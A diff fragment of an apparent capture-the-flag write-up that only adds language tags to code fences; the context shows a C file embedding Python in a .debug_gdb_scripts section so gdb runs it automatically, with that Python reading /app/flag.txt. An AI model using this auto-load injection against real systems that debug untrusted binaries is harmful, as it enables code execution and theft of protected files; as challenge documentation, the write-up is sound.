@@ -35,7 +35,7 @@ We will use the second since we can't use any python scripts on the server
 ## Solution
 
 We make a basic c file using the docs sample:
-```
+```c
 asm(
 ".pushsection \".debug_gdb_scripts\", \"MS\",@progbits,1\n"
 ".byte 4\n"                          // SECTION_SCRIPT_ID_PYTHON_TEXT = 4
@@ -53,7 +53,7 @@ int main(){}
 ```
 
 which embeds the python code:
-```
+```python
 import gdb
 f = open('/app/flag.txt', 'r')
 content = f.read()
